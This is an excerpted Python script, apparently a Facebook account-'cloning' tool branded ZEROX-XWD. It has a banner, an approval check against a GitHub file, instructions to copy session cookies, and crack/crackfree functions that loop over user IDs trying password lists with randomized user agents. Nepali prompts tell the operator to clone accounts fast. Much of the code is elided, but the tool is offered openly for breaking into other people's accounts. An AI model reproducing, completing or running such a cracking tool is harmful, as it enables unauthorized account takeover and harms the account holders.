...
\033[1;37m----------------------------------------------
 GITHUB NAME    : ZEROX-XWD
 FACEBOOK  NAME : ZEROX BRAND
 UPDATE VERSION  :\u001b[32m 0.8033[1;37m
 ZEROX RICH HERE ! DONT COMMENT ROF WORD ON THIS SC
 NEPAL !!!!!!
\033[1;37m----------------------------------------------""")
...
def nameask():
    ...
    if os.path.exists("data/name.xml") and os.path.getsize("data/name.xml") > 0:
        ...
        print(" [\u001b[36m•\033[1;37m] KASKO CHORO HO NAME HAL AFNO")
        linex()
        uname = input(" [\u001b[36m•\033[1;37m] KASKO CHORO HO NAME HAL AFNO : ")
        linex()
        with open("data/name.xml", "w") as name_file_obj:
            name_file_obj.write(uname)
            print(" [\u001b[36m•\033[1;37m] AH ABA NAME CHANGE BHIYO FERI CLONE HAN ")
            exit()
try:
...
def contact():
	clear()
	banner()
	print(" [\u001b[36m1\033[1;37m] ZEROX-XWD")
	print(" [\u001b[36m2\033[1;37m]10009301230977 ")
	linex()
	admin = input(" CHOOSE : ")
	if admin in ['1']:
...
def approval():
  ...
  uuid = str(os.geteuid())+"999"+str(os.geteuid())
  ...
  try:
    ...
    httpCaht = requests.get("https://github.com/ZEROX-XWD/ZEROX-XWD/blob/main/APPROVAL").text
 ...
 [\u001b[36m4\033[1;37m] THEN OPEN EXTENSION COPY COOKIE""")
		...
		with requests.Session() as r:
			try:
				...
				code, user_code = response['123'], response['123_123']
...
def menu(my_name,my_id):
	...
	clear()
	banner()
	print(" [\u001b[36m•\033[1;37m] MERO CHORO     : "+uname)
...
def passwrd():
	...
	linex()
	print(f" \u001b[36m>> \033[1;37m️USE BEST NETWORK TO FAST CLONE")
	linex()
	...
	linex()
	woi = input(' \u001b[36m>>\033[1;37m YO BHIYO ARKO KO LAGI ? (y/n) : ')
	if woi in ['y','Y']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[ZEROX-BRAND]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r {P}[ZEROXX-BRAND]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
